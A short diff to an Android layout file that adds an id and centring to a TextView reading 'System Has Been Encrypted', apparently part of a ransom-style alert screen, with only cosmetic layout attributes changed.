@@ -32,6 +32,7 @@
         android:textStyle="bold" />
 
     <TextView
+        android:id="@+id/v_msg"
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
         android:text="System Has Been Encrypted"
@@ -39,7 +40,8 @@
         android:textSize="22sp"
         android:textStyle="bold"
         android:shadowColor="#FF0000"
-        android:shadowRadius="15" />
+        android:shadowRadius="15"
+        android:gravity="center" />
 
     <TextView
         android:id="@+id/v_display"
